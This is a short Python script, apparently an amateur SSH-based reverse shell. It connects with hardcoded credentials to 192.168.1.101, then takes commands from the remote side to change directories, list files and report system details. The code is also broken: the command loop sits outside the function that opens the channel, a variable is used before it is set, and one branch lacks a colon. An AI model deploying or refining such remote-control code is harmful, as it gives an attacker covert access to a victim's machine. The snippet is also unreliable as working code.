import paramiko
import os

def connect():
	client = paramiko.SSHClient()
	client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
	client.connect('192.168.1.101',username='deneme',password='deneme')
	chan = client.get_transport().open_session()
	chan.send("BAĞLANDI!")
	print chan.recv(1024)

while True:
	command= chan.recv(1024)
	if 'terminate' in command:
		chan.close()
		break
	elif 'pwd' in command:
		chan.send ("[+] Current Working Diroctary is"+os.getcwd())
		chan.send(str(dirs))
	elif 'is' in command:
		dirs=os.listdir(os.getcwd())
		chan.send(str(dirs))
	elif 'cd' in command
		try:
			code,directory= command.split (' ')
			os.chdir(directory)
			chan.send("[+]Current Working Diroctary is"+os.getcwd())
		except:
			chan.send("[-]Error, try again check the Diroctary")
	elif 'uname' in command:
		chan.send(str(os.uname()))
connect()
